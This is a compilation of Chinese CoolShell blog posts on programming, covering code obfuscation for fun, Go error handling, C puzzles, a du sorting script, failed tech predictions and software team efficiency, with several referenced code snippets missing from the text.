不过，通过这种极端的写法，大家可以看到源代码都可以写得那么复杂难懂的。大家也许在赞叹之余一笑了之，而我则希望，大家能够在娱乐以后认真思考一下，你不要以为咱们自己不会把代码搞得那么复杂，只不过没有像那6个Hello World一样那么极端，不过，说句老实话， **咱们每个程序都有把清晰的程序搞得一团混乱的潜能，只不过程度不一样罢了，我并不是在这里危言耸听，大家好自为之** 。下面是一个Step by Step的教程，教你如何把一个清晰的代码变得复杂难懂的。当然，这只是一个“简明教程”了。还是那句话——“本文仅供朋友们“消遣作乐”，如果你要觉得有意思的话，顶个贴。如果你觉得没什么意思的话，一笑了之。仅供娱乐而已，不必太过认真。”目录* 开始程序   * 第一步、把for变成while   * 第二步，把循坏变成递归   * 第三步，弄乱代码结构/使用没有含义的变量名   * 第四步，取消临时变量   * 第五步，继续弄乱变量名   * 第六步，移除常量#### 开始程序下面是一个找出素数的程序：下面我们来看看如何把上面这段代码搞得复杂难懂。#### 第一步、把for变成while通常来说，for循坏要以while循坏简单一些，上面的程序有二重for循环，我们不但要把其变成while循环，而且还要把二重循环的变成一重的循环，然后使用大量的if- else语句来判断。
#### 第二步，把循坏变成递归递归在某些时候是可以把代码变得简单，但大多数的情况下是把代码变得复杂，而且很没有效率。下面是把上面的while循环变成了递归。变成了递归后，函数的参数都变成3个了。#### 第三步，弄乱代码结构/使用没有含义的变量名关于如何弄乱代码结构，其中一个小技巧是，使用“？”表达式代替if-else语句。#### 第四步，取消临时变量临时变量一般用来保存反复使用的一个表达式的值。使用大量重复的表达式来取消这些临时变量的也可以让代码复杂起来。#### 第五步，继续弄乱变量名我们知道，下划线是合法的变量名，所以，我们不妨用__，___，____来代替m，t，c。函数名也可以使用下划线来代替。让我们来看看求素数的函数能变成什么。#### 第六步，移除常量在上面的程序中，还有一些常量，你可以通过增加一个宏定义，或是增加一个函数的形参来取代这一常量。程序到这里应该差不多了。还是那句话——“ **每一个程序员都有把源代码弄复杂的潜质** ”，大家好自为之。# Go 编程模式：错误处理作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
错误处理一直以一是编程必需要面对的问题，错误处理如果做的好的话，代码的稳定性会很好。不同的语言有不同的出现处理的方式。Go语言也一样，在本篇文章中，我们来讨论一下Go语言的出错出处，尤其是那令人抓狂的 `if err != nil` 。在正式讨论Go代码里满屏的 `if err != nil` 怎么办这个事之前，我想先说一说编程中的错误处理。这样可以让大家在更高的层面理解编程中的错误处理。### 本文是全系列中第2 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程« 上一篇文章下一篇文章 »目录* C语言的错误检查   * Java的错误处理   * Go语言的错误处理   * 资源清理   * Error Check Hell   * 包装错误   * 参考文章
#### C语言的错误检查首先，我们知道，处理错误最直接的方式是通过错误码，这也是传统的方式，在过程式语言中通常都是用这样的方式处理错误的。比如 C 语言，基本上来说，其通过函数的返回值标识是否有错，然后通过全局的 `errno` 变量并配合一个 `errstr` 的数组来告诉你为什么出错。为什么是这样的设计？道理很简单，除了可以共用一些错误，更重要的是这其实是一种妥协。比如：`read()`, `write()`, `open()` 这些函数的返回值其实是返回有业务逻辑的值。也就是说，这些函数的返回值有两种语义，一种是成功的值，比如 `open()` 返回的文件句柄指针 `FILE*` ，或是错误 `NULL`。这样会导致调用者并不知道是什么原因出错了，需要去检查 `errno` 来获得出错的原因，从而可以正确地处理错误。一般而言，这样的错误处理方式在大多数情况下是没什么问题的。但是也有例外的情况，我们来看一下下面这个 C 语言的函数：int atoi(const char *str)这个函数是把一个字符串转成整型。但是问题来了，如果一个要传的字符串是非法的（不是数字的格式），如 “ABC” 或者整型溢出了，那么这个函数应该返回什么呢？出错返回，返回什么数都不合理，因为这会和正常的结果混淆在一起。比如，返回 `0`，那么会和正常的对 “0” 字符的返回值完全混淆在一起。这样就无法判断出错的情况。你可能会说，是不是要检查一下 `errno`，按道理说应该是要去检查的，但是，我们在 C99 的规格说明书中可以看到这样的描述——
> 7.20.1The functions atof, atoi, atol, and atoll need not affect the value of > the integer expression errno on an error. If the value of the result cannot > be represented, the behavior is undeﬁned.像`atoi()`, `atof()`, `atol()` 或是 `atoll()` 这样的函数是不会设置 `errno`的，而且，还说了，如果结果无法计算的话，行为是undefined。所以，后来，libc 又给出了一个新的函数`strtol()`，这个函数在出错的时会设置全局变量 `errno` ：long val = strtol(in_str, &endptr, 10);  //10的意思是10进制//如果无法转换     if (endptr == str) {     fprintf(stderr, "No digits were found\n");     exit(EXIT_FAILURE);     }
//如果整型溢出了     if ((errno == ERANGE && (val == LONG_MAX || val == LONG_MIN)) {     fprintf(stderr, "ERROR: number out of range for LONG\n");     exit(EXIT_FAILURE);     }//如果是其它错误     if (errno != 0 && val == 0) {     perror("strtol");     exit(EXIT_FAILURE);     }虽然，`strtol()` 函数解决了 `atoi()` 函数的问题，但是我们还是能感觉到不是很舒服和自然。因为，这种用 返回值 + errno 的错误检查方式会有一些问题:* 程序员一不小心就会忘记返回值的检查，从而造成代码的 Bug；   * 函数接口非常不纯洁，正常值和错误值混淆在一起，导致语义有问题。所以，后来，有一些类库就开始区分这样的事情。比如，Windows 的系统调用开始使用 `HRESULT` 的返回来统一错误的返回值，这样可以明确函数调用时的返回值是成功还是错误。但这样一来，函数的 input 和 output 只能通过函数的参数来完成，于是出现了所谓的 入参 和 出参 这样的区别。
然而，这又使得函数接入中参数的语义变得复杂，一些参数是入参，一些参数是出参，函数接口变得复杂了一些。而且，依然没有解决函数的成功或失败可以被人为忽略的问题。#### Java的错误处理Java语言使用 `try-catch-finally` 通过使用异常的方式来处理错误，其实，这比起C语言的错处理进了一大步，使用抛异常和抓异常的方式可以让我们的代码有这样的一些好处：* 函数接口在 input（参数）和 output（返回值）以及错误处理的语义是比较清楚的。   * 正常逻辑的代码可以与错误处理和资源清理的代码分开，提高了代码的可读性。   * 异常不能被忽略（如果要忽略也需要 catch 住，这是显式忽略）。   * 在面向对象的语言中（如 Java），异常是个对象，所以，可以实现多态式的 catch。   * 与状态返回码相比，异常捕捉有一个显著的好处是，函数可以嵌套调用，或是链式调用。比如：      * `int x = add(a, div(b,c));`     * `Pizza p = PizzaBuilder().SetSize(sz).SetPrice(p)...;`#### Go语言的错误处理
Go 语言的函数支持多返回值，所以，可以在返回接口把业务语义（业务返回值）和控制语义（出错返回值）区分开来。Go 语言的很多函数都会返回 result, err 两个值，于是:* 参数上基本上就是入参，而返回接口把结果和错误分离，这样使得函数的接口语义清晰；   * 而且，Go 语言中的错误参数如果要忽略，需要显式地忽略，用 _ 这样的变量来忽略；   * 另外，因为返回的 `error` 是个接口（其中只有一个方法 `Error()`，返回一个 `string` ），所以你可以扩展自定义的错误处理。另外，如果一个函数返回了多个不同类型的 `error`，你也可以使用下面这样的方式：我们可以看到，Go语言的错误处理的的方式，本质上是返回值检查，但是他也兼顾了异常的一些好处 – 对错误的扩展。#### 资源清理出错后是需要做资源清理的，不同的编程语言有不同的资源清理的编程模式：* C语言 – 使用的是 `goto fail;` 的方式到一个集中的地方进行清理（有篇有意思的文章可以看一下《由苹果的低级BUG想到的》）   * C++语言- 一般来说使用 RAII模式，通过面向对象的代理模式，把需要清理的资源交给一个代理类，然后在析构函数来解决。   * Java语言 – 可以在finally 语句块里进行清理。   * Go语言 – 使用 `defer` 关键词进行清理。
下面是一个Go语言的资源清理的示例：func main() {     r, err := Open("a")     if err != nil {     log.Fatalf("error opening 'a'\n")     }     defer Close(r) // 使用defer关键字在函数退出时关闭文件。r, err = Open("b")     if err != nil {     log.Fatalf("error opening 'b'\n")     }     defer Close(r) // 使用defer关键字在函数退出时关闭文件。     }#### Error Check Hell好了，说到 Go 语言的 `if err !=nil` 的代码了，这样的代码的确是能让人写到吐。那么有没有什么好的方式呢，有的。我们先看如下的一个令人崩溃的代码。var p Point要解决这个事，我们可以用函数式编程的方式，如下代码示例：read(&p.Longitude)     read(&p.Latitude)     read(&p.Distance)     read(&p.ElevationGain)     read(&p.ElevationLoss)
上面的代码我们可以看到，我们通过使用Closure 的方式把相同的代码给抽出来重新定义一个函数，这样大量的 `if err!=nil` 处理的很干净了。但是会带来一个问题，那就是有一个 `err` 变量和一个内部的函数，感觉不是很干净。那么，我们还能不能搞得更干净一点呢，我们从Go 语言的 `bufio.Scanner()`中似乎可以学习到一些东西：scanner := bufio.NewScanner(input)上面的代码我们可以看到，`scanner`在操作底层的I/O的时候，那个for-loop中没有任何的 `if err !=nil` 的情况，退出循环后有一个 `scanner.Err()` 的检查。看来使用了结构体的方式。模仿它，我们可以把我们的代码重构成下面这样：首先，定义一个结构体和一个成员函数type Reader struct {     r   io.Reader     err error     }然后，我们的代码就可以变成下面这样：r.read(&p.Longitude)     r.read(&p.Latitude)     r.read(&p.Distance)     r.read(&p.ElevationGain)     r.read(&p.ElevationLoss)
return &p, nil     }有了上面这个技术，我们的“流式接口 Fluent Interface”，也就很容易处理了。如下所示：package mainimport (     "bytes"     "encoding/binary"     "fmt"     )// 长度不够，少一个Weight     var b = []byte {0x48, 0x61, 0x6f, 0x20, 0x43, 0x68, 0x65, 0x6e, 0x00, 0x00, 0x2c}     var r = bytes.NewReader(b)func main() {     p := Person{}     p.ReadName().ReadAge().ReadWeight().Print()     fmt.Println(p.err)  // EOF 错误     }相信你应该看懂这个技巧了，但是，其使用场景也就只能在对于同一个业务对象的不断操作下可以简化错误处理，对于多个业务对象的话，还是得需要各种 `if err != nil`的方式。#### 包装错误最后，多说一句，我们需要包装一下错误，而不是干巴巴地把`err`给返回到上层，我们需要把一些执行的上下文加入。
通常来说，我们会使用 `fmt.Errorf()`来完成这个事，比如：另外，在Go语言的开发者中，更为普遍的做法是将错误包装在另一个错误中，同时保留原始内容：当然，更好的方式是通过一种标准的访问方法，这样，我们最好使用一个接口，比如 `causer`接口中实现 `Cause()` 方法来暴露原始错误，以供进一步检查：这里有个好消息是，这样的代码不必再写了，有一个第三方的错误库（github.com/pkg/errors），对于这个库，我无论到哪都能看到他的存在，所以，这个基本上来说就是事实上的标准了。代码示例如下：import "github.com/pkg/errors"//错误包装     if err != nil {     return errors.Wrap(err, "read failed")     }// Cause接口     switch err := errors.Cause(err).(type) {     case *MyError:     // handle specifically     default:     // unknown error     }
#### 参考文章* **Golang Error Handling lesson by Rob Pike   *** **Errors are values   **（全文完）# 谁说C语言很简单？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前两天，Neo写了一篇《语言的歧义》其使用C语言讨论了一些语言的歧义。大家应该也顺便了解了一下C语言中的很多不可思异的东西，可能也是你从未注意到的东西。是的，C语言并不简单，让我们来看看下面这些示例：1. **为什么下面的代码会返回0？(这题应该很简单吧)   **int x;     return x == (1 && x);本题主要是关于C/C++中变量初始化的问题。2. **为什么下面的代码会返回0而不是-1？**return ((1 - sizeof(int)) >> 32);答案：`sizeof` 是一个unsigned的类型，所以……3. **代码作用域是一件很诡异的事，下面这个函数返回值是什么？   **答案：54. **函数和函数指针可以相互转换。下面的语句哪些是合法的？   **
pf = &f; // 没问题     pf = ***f; // 取址？     pf(); // 函数指针可以调用？        (****pf)();  // 这又是什么？     (***************f)(); // 这个够变态了吧？     }答案：全部合法。5. **初始化可能是ISO C中最难的部分了。无论是MSVC 还是GCC 都没有完全实现。GCC 可能更接近标准。在下面的代码中，` i.nested.y` 和`i.nested.z的最终值是什么？`**答案：2和66. **下面这个示例是C语言的痛，main函数返回值是什么？**答案：1（你知道为什么吗？）7. **下面这个例就更变态了。在GCC的文档中，这个语法是合法的，但是不知道为什么GCC并没有实现。下面的代码返回 2.**8. **在下面的这个示例中，有一个“bar” 函数及其函数指针 “pbar” 的两个拷贝(static 类型一般作用于语句块或文件域).**}static (*pbar)() = 0;9. **下面的这个函数返回值是什么？取决于编译器是先处理unsigned long转型，还是负号。**
如果是： `((unsigned long) - 1) / 8，那将是一个很大的数。   ``如果是：` `(unsigned long) (- 1 / 8 )`, 那将是 0是的，这样使用C语言可能很奇怪，不过我们可以从另一方面了解C语言的很多我们不常注意的特性。C语言其实并不容易。# Linux磁盘使用命令du的改进作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们知道，在Linux下，如果你想知道当前目录下，每个文件或子目录的尺寸，你可以使用du命令来完成这一动作。如：$  du -sh *这个命令可以以K，M，G的方式显示每个文件和子目录的大小。我们把这种方式叫做，human-readable，也就是可以让人读的方式，如下所示：8.4G Desktop     2.6G Documents     12K keys     12M Pictures     536K scripts但是，很可惜的是，我们的du并没有提供相关的排序功能，所以，如果在human-readable下，也就是- h参数下，我们很难使用sort命令来排序。因为那变成了字符串排序，小数点，数字的位数，还有单位K，M，G都会让排序变得混乱。那么，我们如何才能即有human- readble这种功能，还能有排序呢。我们得借用一些脚本语言来处理了。
下面是使用了Perl来达到这一功能：du -sk * | sort -n |       #以 K 字节的方式排序     perl -ne '                 #使用Perl来处理 K M 和 G 单位     ($s,$f)=split(m{\t});    #把 尺寸/文件名 分开     for (qw(K M G)) {        #以尺寸单位循环     if($s<1024) {         #如果 尺寸<1024 那么就输出     printf("%.1f",$s);  #显示文件尺寸     print "$_\t$f";     #显示文件名     last                #换行     };     $s=$s/1024            #除1024然后进入下一个尺寸单位     }     '# 另类UX让你输入强口令作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn昨天和大家说了一下关于口令破解的一些东西，那篇文章告诉我们需要设置一个比较强的不易破解的口令。今天在网上看到一个强大的jQuery插件，叫NakedPassword，其通过“ **强大的用户体验** ”让你输入一个比较强且不易被破解的口令。虽然有点另类，但是我个人相当欣赏这个UX，因为UX实在是太到位了—— **只有你输入的口令比较强，图片中的女人才会脱光衣服** 。
下面是演示：请输入你的口令（输入时出现效果）这个例子和以前的那个例子一样，告诉你UX设计是重要性。（全文完）# 编程语言时间地理图作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn有人使用Google Map做了一个网页，把所有编程语言的时间线和地理位置，如下图，上面是一个编程语言的时间轴，下面是Google Map地图，点击编程语言，你可以查看该编程语言的发明者，发明地，和其Hello World示例（点击这里查看更多的Hello World）**http://www.geospat.com/hoprola/**   !编程语言时间地理图!JavaScript 的发明者，发明地和示例（点击小星，可以看到语言的发明者和示例）# 几个有意思的漫画作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn目录* 软件Bug和软件Feature的差别   * 一个理解流程图的指南   * 什么叫极限编程   * 如何衡量好的代码#### 软件Bug和软件Feature的差别注释：有时候bug和feature的差别就是bug长得难看了一些。
!bug-feature#### 一个理解流程图的指南!flow_charts#### 什么叫极限编程注释，对话翻译——1）程序员：我不能在第一个版本给你所有的的功能。   2）程序员：并且，每个功能需要有一个所谓的“用户案例（User Story）”   3）用户：好吧，我告诉你一个“用户案例”——我要所有的功能，不然我就毁了你的生活。!extreme-programming#### 如何衡量好的代码注释：下图中用“代码审核”流程中的每分钟出现“脏话”的个数来衡量代码的质量。（WTF is stand for “What the F**K”）!measurement-of-code-quality# 十大最失水准的科技预测作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn英国权威消费数码杂志T3评出了有史以来十大最失水准的科技预测。比尔·盖茨也占了其中2项。预测未来的确是一件很难的事情，即便是最聪明的人也会马失前蹄。1\. 下一个圣诞节，iPod将会死去，完蛋，过时。 _Allan Sugar爵士（一个很著名的英国企业家，和BBC合作一个著名的节目《学徒》）, 2005.   _2\. 家庭不需要有一台电脑。 _Ken Olsen, Digital Equipment简称DEC的创始人, 1977._   3\. 核能吸尘器将在10年内成为现实。 _Alex Lewyt（_ 真空吸尘器公司Lewyt Corp的CEO _）, 1955._   4\. 电视不可能兴盛起来，因为人们“很快就会因为每晚盯着一个胶合板盒子而感到厌烦”。 _Darryl Zanuck（_ 好莱坞多栖明星 _）, 1946._   5\. 1933年，在可容纳10名乘客的波音247首航之后，一名自豪的波音工程师曾表示：“永远不可能制造出比247更大的飞机”。 _Boeing engineer, 1933._
6\. 我们已处在火箭邮递时代开始的前夜。 _Arthur Summerfield（美国邮政部长）, 1959._   7\. 不可能再有人需要为自己的PC安装超过640 KB的内存。 _Bill Gates, allegedly in 1981_   8\. 美国人需要电话，但我们并不需要，因为我们有数量庞大的信差。 _William Preece 爵士,_ 英国邮政总局首席工程师 _, 1874._   9\. 垃圾邮件问题将在两年内得到解决。 _Bill Gates, 2004._   10\. 事实将证明，X射线不过是一个骗局。 _Lord Kelvin,_ 英国皇家学会会长 _, 1883._原文链接: http://www.t3.com/news/sugar-ipod-error-is-worst-tech- prediction?=37516# 开发团队的效率作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我之前写过一篇叫《加班与效率》的文章，从概念上说了一些我对“效率”的认识，但是那篇文章趋于概念化，对于一些没有经历过这样的环境的同学来说，可能会觉得太抽象了。很早以前就想写一篇更具体一点的，可执行的文章与《加班与效率》这篇文章相辉映，并再把我两年前在杭州QCon上的那个“ **鼓吹工程师文化”的《建一支强大的小团队》**（新浪微盘）的观点再加强一下。
**但是我遇到了一些思维方式上的麻烦——我讲的总是从我的经历背景出发，没有从其它人的经历背景来讲** 。这就好像，我在酷壳里说了很多东西（比如：专职的QA，Code Review很重要，编程年龄，创业的，Rework的……），有好些人觉得是不可能甚至太理想，其实我说的那些东西都是实实在在存在的，也是我所经历过的。于是，不同的经历，不同的环境，不同的眼界，造成了——有些人不理解我说的，而我也不能理解他们所说的。所以，过去的这段时间我一有机会就找一些人交流并观察一些身边的事情，并去试着跟从和理解那些我不能理解的东西。现在觉得差不多了，所以，写下了这篇文章。（但越是去理解对方，我就越坚持我的观点，所以这篇文章可能还是会出现鸡同鸭讲的情形，无所谓了）本文不讨论任何业务上的效率问题，只讨论软件开发或是软件工程中的效率问题。虽然产品和业务上的效率问题是根本，但是因为本文不是拉仇恨的，我也不想混在一起谈，所以请原谅我在这里先说开发团队的，以后重新开篇文章专门谈产品和业务的。我下面会罗列几个非常典型的开发方式—— **软件开发中的“锁”** ， **接力棒式软件开发** ， **保姆式软件开发** ， **WatchDog软件开发** ， **故障驱动式软件开发** 。
目录* 软件开发中的“锁”     * 【解决方案】   * “接力棒式”软件开发     * 【解决方案】   * “保姆式”软件开发     * 【解决方案】   * “WatchDog式”软件开发     * 【解决方案】   * “故障驱动式”软件开发     * 【解决方案】   * 其它开发方式   * 总结一下#### 软件开发中的“锁”如果你搞过并发编程，你一定知道什么是“锁”，锁就是用来同步和互斥。我发现有好些开发部门里的各个开发团队间存在很多锁。比如：* **技术能力上的锁** 。有一个项目需要在不同的地方做开发，这些模块用到不同的技术，比如：Java, C/C++, Python，Javascript，但是，这个团队里的每一个开发人员就只懂一门语言，于是，需要配合，需要任务排期，同步互斥锁就很多，于是，一个本来只需要2个人干3周的的工作变成了8个人干两个月。* **负责模块上的锁** 。同理，不同的人负责不同的模块，于是一个项目要动好多模块，那么你就需要把这些模块的人找过来，和上面一样。每个人都有自己的时间安排，人越多，锁越多。于是，一个来来只需要2个人干2两周的事，变成了7、8个人干一个多月。
我上面并非瞎扯，这都是事实。我们可以看到，* **时间锁、进度锁** 。这堆有不同技能或是负责不同模块的开发人员有锁，有锁你就要等，他们有自己的安排，所以，要协作起来，你就需要排期，去同步。而参与的人越多，你的锁就越多。你协调他们的时间就更复杂。* **沟通锁、利益锁** 。而且，最恐怖的事情是，他们之间的沟通成本巨大。他们会花大量的时间在讨论，一个功能是实现在你那边，还是我这边，每个人都有自己的利益和算盘。无形中增加了很多推诿、官僚和政治上的东西。有时候，我们会觉得分工和分模块是产生效率的前提，但是实际情况并不是这样。我们也可以看到， **所谓的“分工”被彻彻底底的滥用了** 。他们把“分工”当成了永远只干一件事的借口。##### 【解决方案】**一个程序员应该能够掌握多个语言，也能够负责多个模块甚至不同的职责。如果一个程序员觉得多学习一门语言，多掌握一个模块是件很困难的事，那么这个程序员本质上是不合格的** 。#### “接力棒式”软件开发**在有各种“工作锁”的软件开发团队里，一般都无法避免“接力棒式”的开发** 。也就是说，底层的C程序员干完了，交给上层的Java程序员，然后再交给更上层的前端程序员，最后再交给运维人员。这就是接力棒式的开发。
而且，更糟糕的是，如果在引入了软件流程下，这种“接力棒的方式”真是会把你搞崩溃的。比如下游团队开发一个月，交给QA测试一个月，再交给运维分步上线一个月，然后，上游团队拿到下游开发的API后开发一个月，再交给自己的QA测试一个月，然后再交给自己的运维上线一个月，于是，半年就这样过去了。 **这是一个由一个一个小瀑布叠出来的一个大瀑布** 。哦，你会说，这个好办啊，上下游不会先商定好接口么？然后做并行开发么？是的，这是其中的一个优化方式，但是需要很好的接口设计。但是，在实际过程中，你会发现（这时我并非信口开河，我说的都是事实），* 如果这两个上下游团队在一起还好办，要是不在一起，那么，实际情况是，后面的团队会等到前面的团队提测了，才开始开发，本质上就是串行开发的。* 如果有更多的团队呢？比如：A团队 -> B团队 -> C团队 ->D团队呢。接口就变得非常地关键了。而在实际情况下，因为没有好的接口设计人员，所以，在开发过程经常性地修改接口，或者是因为接口不好用也只得忍着。##### 【解决方案】我以前写过一篇叫《IoC/DIP其实是一种管理思想》，对于这种接力棒的方式，应该反过来， **如果业务应用团队是A团队，那B/C/D团队应该把自己的做成一个开发框架也好，服务化也好，让应用团队自己来接入** 。比如：前端做好一个前端开发框架，PE做好一个运维开发框架、各种工具，共享模块团队做好开发框架，让应用团队自己来接入，而不是帮他做。 **你会发现，在这么多团队各自P2P勾兑出来的很随意的接口的所带来的成本已经远超过一个统一标准的协议** 。
#### “保姆式”软件开发所谓“保姆式”软件开发就是——我只管吃饭，不管做菜洗碗，就像——衣来伸手，饭来张口的“小皇帝”一样，身边有一堆太监或宫女，不然生活不能自理。这种情况经常见于开发和测试，开发和运维间的关系。很多公司，测试和运维都成了开发的保姆。我就能看到，很多开发快速写完代码后基本上都不怎么测试就交给QA去测试了，QA一测，我草，各种问题，而只会做黑盒的QA并不能马上就能确定是代码的问题还是环境的问题，所以还要花大量时间排除不是环境问题，才给开发报BUG。很多问题，可能只需要做个Code Review，做个单测就可以发现了，硬要交给QA。运维也是一样的，开发出来的软件根本就没有考虑什么运维的东西，因为有运维人员，所以我才不考虑呢。**这和我们带孩子的道理是一样的，对于孩子来说，如果父母帮孩子做得越多，孩子就越觉得理所应当，就越不会去做** 。**“保姆式”开发一般会进化成“保安式”开发** 。* 因为你的团队开发人员的能力不行，设计不行，Code Reivew/UT不做，你就只能找堆QA看着他。   * 因为Dev/QA只管功能不管运维，所以，还得找堆运维人员看着他们。   * 因为你的技术人员不懂业务，不懂需求，需要再找个BA，找个产品经理来指挥他。   * 因为你的技术人员不会管理项目，所以，再搞个项目经理，找个敏捷教练、以及SQA来管着他。
**就这样，你不行，我找人来看着你，看你的人不行，我再找人来看着看你的人……层层保姆，层层保安。** 于是，你就会发现，团队或部门里的人员越来越多，你整天都在开会，整天都在互相解释，互相争吵，会扯淡的人越来越多。那还有个屁的效率。网络上一个非常经典的图片，来源不详，程序员在挖坑，其它人站在当监工##### 【解决方案】1） **不要招只会写代码的“码农”，要招懂“需求”，注重“软件工程”和“软件质量”和“软件维护”的“工程师”** 。2） **最好的管理，不是找人来管人，而是自己管自己** 。3） **组织和团队中支持性工作的人越少越好，最好不要** 。4） **服务化。我服务于你并不代表我要帮你干活，而是代表——我要让你干活干得更爽** 。我在微博上说过下面的话，（大家可以体会一下保姆和服务的差别）运维要用“云服务”的思路去做。如果一个公司内的运维团队开发出一堆工具，让做应用开发团队可以很容易地申请机器、存储、网络、中间件、安全等资源，并很容易管理、监控和部署应用，并提供运维资询。而不是帮应用开发团队干活擦屁股当保姆。那么，这个公司就会不经意地做出一个云计算平台来了。#### “WatchDog式”软件开发
什么是WatchDog？就是说—— **为了解决某个系统的问题，我要用一个新的系统去看着它** 。* 我的系统架构太复杂，出了问题不好查找。咋办？那就搞个专门的特殊的监控系统吧……* 我的系统配置太复杂，容易配错了。咋办？那就加一个配置校验系统吧……* 我的系统配置和真实的情况有时候可能会不一性。咋办？那就加一个巡检系统吧……* 我的系统测试环境和线上环境有时候会搞混了。咋办？那就为线上环境加一个权限控制系统吧……* 我的系统有单点，那就加个负载均衡器吧，负载均衡器的单点呢？那就再加个等价路由器吧……**做加法谁不会？就不想去简化一样系统吗？就不能不拆东墙补西墙么？** 这些了系统加的越来越多，我看你以后怎么运维。一开始没有想清楚就放到线上，然后，出了故障后，也无法重新设计和重新架构，只能以打补丁地方式往上打，这就好像一个本来就有缺陷的楼没有盖好，你要拆了重盖是不可能的，也只能不停地打补丁了。字是一只狗，越描越丑。##### 【解决方案】**1）设计想好了再做，多评估几个设计没坏处，简化，简化，简化。****2）残酷无情地还债，就算是CEO来了，也无法阻止我还债的脚步。**#### “故障驱动式”软件开发
WatchDog式的软件开发通常来说都是“故障驱动式”软件开发的产物。这种开发方式其实就是在表明自己智力和能力的不足。以上线为目的，上了线再说，有什么问题出了再改。上面的老大或是业务方基本上会说，没关系，我们不一开始并不需要一个完美的系统，你先上了再说，先解业务的渴，我们后面有时间再重构再完善。而有的技术人员也会用“架构和设计是逐步演化出来的”这句话来证明“故障驱动”开发是值得的。我同意逐步迭代以及架构演化论，但是，我觉得 **“系统迭代说”和“架构演化论”被彻彻底底地成为那些能力有限甚至不学无术的人的超级借口** 。你们有没有搞错啊？你们知道什么叫迭代，什么叫演化吗？你们知道，要定位一个线上的故障需要花多大的力气吗？（看看这篇文章你就知道了）你们知道，随随便便去应付局部上你会快，但总体上来说你会慢。虽然，我看到那些系统在一个又一个的故障后得到一点又一点的改善，但是我想说，为什么一开始不认真不严谨一点呢？我从来就没有见过一个精良的系统是靠一个一个的故障和失败案例给堆出来的，就算是Windows 95/98这样史上最烂的操作系统，如果没有设计精良Windows NT的补位，Windows也早玩完了（看看IE的下场就知道了）。
##### 【解决方案】**1）基础知识和理论知识非常重要** 。多多使用已有的成熟的方案是关键。**2）对技术要有一颗严谨和敬畏的心。想清楚了再干，坚持高标准，Design for failure!** 很多事情都急不得。#### 其它开发方式其实，这样的事情还有很多。比如：**1）配置管理上的问题** 。对于源代码的配置管理，其实并不是一件简单的事情。配置管理和软件和团队的组构的结构非常有关系。我看到过两种非常没有效率的配置管理，一种是以开项目分支的方式来做项目，同时开很多分支，分支开的时间还很长，导致merge回主干要花大量的时间去解决各种冲突，另一种是N多的团队都在一个代码库中做修改，导致出现很多复杂的问题，比如某团队的改动出现了一个bug，要么所有的团队的功能都得等这个bug被修复才能被发布，要么就是把所有的改动回滚到上一个版本，包括其它团队开发的功能。很明显，软件模块的结构，软件的架构，以及团队的组织形式都会严重影响开发效率。**2）人肉式的软件开发** 。大多数的软件团队和主管都会用“人手不够”做为自己开发效率不够的借口，而大多数故障发生的时候，都会使用更重的“人肉流程”来弥补自己能力的不足。他们从来没有想过使用“技术”，使用更“聪明”的方式来解决问题。
**3）会议驱动式开发** 。人多了，团队多了，想法也就多了，沟通也就多了，于是需要不停得开会开会开会。#### 总结一下综上所述，我有如下总结：1） **软件工程师分工分得越细这个团队就越没效率，团队间的服务化是关键的关键** 。不管是从语言上还是从软件模块上的人员分工，越细越糟糕。服务化不是我要帮你做事，而是我让你做起事来更容易。2） **你总需要在一个环节上认真，这个环节越往前就越有效率，越往后你就越没效率** 。要么你设计和编码认真点，不然，你就得在测试上认真点。要是你设计、编码、测试都不认真，那你就得在运维上认真，就得在处理故障上认真。你总需要在一个地方认真。另外一篇文章你可以看一下——《多些时间少写些代码》3） **“小而精的团队”+“条件和资源受限”是效率的根本** 。只有团队小，内耗才会小，只有条件或资源受限，才会逼着你去用最经济的手段做最有价值的事，才会逼着你喜欢简单和简化。4） **技术债是不能欠的，要残酷无情地还债** 。很多事情，一开始不会有，那么就永远不会有。一旦一个事情烂了，后面只能跟着一起烂，烂得越多，就越没有人敢去还债。5） **软件架构上要松耦合，团队组织上要紧耦合** 。
6） **工程师文化是关键，重视过程就是重视结果** 。只重视结果的KPI等同于“竭泽而渔”和“饮鸩止渴”。（全文完）# Go 编程模式：k8s Visitor 模式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本篇文章主要想讨论一下，Kubernetes 的 `kubectl` 命令中的使用到到的一个编程模式 – Visitor（注：其实，`kubectl` 主要使用到了两个一个是Builder，另一个是Visitor）。本来，Visitor 是面向对象设计模英中一个很重要的设计模款（参看Wikipedia Visitor Pattern词条），这个模式是一种将算法与操作对象的结构分离的一种方法。这种分离的实际结果是能够在不修改结构的情况下向现有对象结构添加新操作，是遵循开放/封闭原则的一种方法。这篇文章我们重点看一下 `kubelet` 中是怎么使用函数式的方法来实现这个模式的。### 本文是全系列中第9 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程
